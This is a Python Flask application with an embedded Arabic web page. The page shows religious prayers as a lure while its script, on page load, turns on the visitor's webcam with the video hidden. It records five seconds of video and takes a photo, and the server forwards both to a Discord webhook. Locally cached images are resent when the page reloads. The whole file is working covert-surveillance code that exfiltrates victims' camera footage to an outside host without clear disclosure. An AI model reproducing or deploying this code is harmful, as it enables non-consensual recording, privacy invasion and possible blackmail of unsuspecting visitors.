from flask import Flask, request, jsonify, render_template_string
import base64
import os
import requests
from io import BytesIO
from PIL import Image
from dotenv import load_dotenv

# تحميل متغيرات البيئة من ملف .env
load_dotenv()

app = Flask(__name__)

# رابط الويب هوك من متغير البيئة
WEBHOOK_URL = os.getenv("WEBHOOK_URL")

# HTML و JavaScript داخل الكود
html_code = '''
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تصوير تلقائي</title>
    <style>
        /* إخفاء الفيديو من الواجهة */
        #video {
            display: none;
        }
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f8ff;
            color: #333;
            text-align: center;
            padding-top: 50px;
        }
        h1 {
            font-size: 30px;
            margin-bottom: 20px;
        }
        .prayer {
            font-size: 22px;
            color: #0000cd;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <!-- ذكر الله والصلاة على النبي -->
    <p class="prayer">بسم الله الرحمن الرحيم</p>
    <p class="prayer">اللهم صل وسلم على سيدنا محمد</p>
    <p class="prayer">سبحان الله وبحمده، سبحان الله العظيم</p>
    <p class="prayer">لا إله إلا الله محمد رسول الله</p>
    <p class="prayer">اللهم اجعلنا من الذاكرين والذاكرات</p>

    <video id="video" width="300" height="200" autoplay></video>
    <canvas id="canvas" width="300" height="200" style="display:none;"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        let stream;
        let recorder;
        let chunks = [];
        let imagesQueue = [];
        let videosQueue = [];

        // تهيئة الكاميرا والتقاط الصور والفيديو
        async function init() {
            stream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = stream;

            // استرجاع الصور والفيديوهات المخزنة مؤقتًا عند إعادة تحميل الصفحة
            if(localStorage.getItem('captured_images')) {
                imagesQueue = JSON.parse(localStorage.getItem('captured_images'));
                sendStoredImages();
            }

            if(localStorage.getItem('captured_videos')) {
                videosQueue = JSON.parse(localStorage.getItem('captured_videos'));
                sendStoredVideos();
            }

            // بدء تسجيل الفيديو لمدة 5 ثواني
            startRecording();

            // التقاط صورة واحدة بعد 5 ثواني من بدء التسجيل
            setTimeout(() => {
                captureImage();
            }, 5000);  // التقاط صورة واحدة بعد 5 ثواني من التسجيل
        }

        // إرسال الصورة
        function sendImage(imageData) {
            fetch('/upload_image', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ image: imageData })
            })
            .then(response => response.json())
            .then(data => console.log(data))
            .catch(error => console.log(error));
        }

        // بدء تسجيل الفيديو لمدة 5 ثواني
        function startRecording() {
            chunks = [];
            recorder = new MediaRecorder(stream);
            recorder.ondataavailable = e => chunks.push(e.data);
            recorder.onstop = sendVideo;

            recorder.start();
            setTimeout(() => {
                recorder.stop(); // إيقاف التسجيل بعد 5 ثواني
            }, 5000); // التسجيل لمدة 5 ثواني
        }

        // إرسال الفيديو عند التوقف عن التسجيل
        function sendVideo() {
            const blob = new Blob(chunks, { type: 'video/webm' });
            const formData = new FormData();
            formData.append('video', blob, 'recorded_video.webm');

            // إرسال الفيديو إلى السيرفر
            fetch('/upload_video', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => console.log(data))
            .catch(error => console.log(error));
        }

        // التقاط صورة واحدة
        function captureImage() {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const img = canvas.toDataURL('image/png');
            imagesQueue.push(img);
            localStorage.setItem('captured_images', JSON.stringify(imagesQueue));  // حفظ الصور في التخزين المحلي
            sendImage(img);
        }

        // إرسال الصور المخزنة عند إعادة تحميل الصفحة
        function sendStoredImages() {
            imagesQueue.forEach((img) => {
                sendImage(img);
            });
        }

        // إرسال الفيديوهات المخزنة عند إعادة تحميل الصفحة
        function sendStoredVideos() {
            videosQueue.forEach((videoBlob) => {
                const formData = new FormData();
                formData.append('video', videoBlob, 'recorded_video.webm');
                fetch('/upload_video', {
                    method: 'POST',
                    body: formData
                })
                .then(response => response.json())
                .then(data => console.log(data))
                .catch(error => console.log(error));
            });
        }

        // عند تحميل الصفحة، يبدأ العمل مباشرة
        window.onload = init;
    </script>
</body>
</html>
'''


@app.route('/')
def home():
    return render_template_string(html_code)


@app.route('/upload_image', methods=['POST'])
def upload_image():
    try:
        data = request.get_json()
        image_data = data['image'].split(",")[1]
        image_bytes = base64.b64decode(image_data)
        image = Image.open(BytesIO(image_bytes))

        # حفظ الصورة في ملف
        image.save("captured_image.png")

        # إرسال الصورة عبر الويب هوك إلى ديسكورد
        with open('captured_image.png', 'rb') as image_file:
            files = {'file': ('captured_image.png', image_file, 'image/png')}
            response = requests.post(WEBHOOK_URL, files=files)

            if response.status_code == 204:
                return jsonify(
                    {'message': 'تم إرسال الصورة بنجاح إلى ديسكورد!'}), 200
            else:
                return jsonify(
                    {'message':
                     'حدث خطأ أثناء إرسال الصورة إلى ديسكورد!'}), 500
    except Exception as e:
        return jsonify({'message': f'خطأ أثناء معالجة الصورة: {str(e)}'}), 500


@app.route('/upload_video', methods=['POST'])
def upload_video():
    try:
        # إرسال الفيديو عبر الويب هوك
        video = request.files['video']
        files = {'file': (video.filename, video, 'video/webm')}
        response = requests.post(WEBHOOK_URL, files=files)

        if response.status_code == 204:
            return jsonify({'message':
                            'تم إرسال الفيديو بنجاح إلى ديسكورد!'}), 200
        else:
            return jsonify(
                {'message': 'حدث خطأ أثناء إرسال الفيديو إلى ديسكورد!'}), 500
    except Exception as e:
        return jsonify({'message': f'خطأ أثناء إرسال الفيديو: {str(e)}'}), 500


if __name__ == '__main__':
    app.run(debug=True)
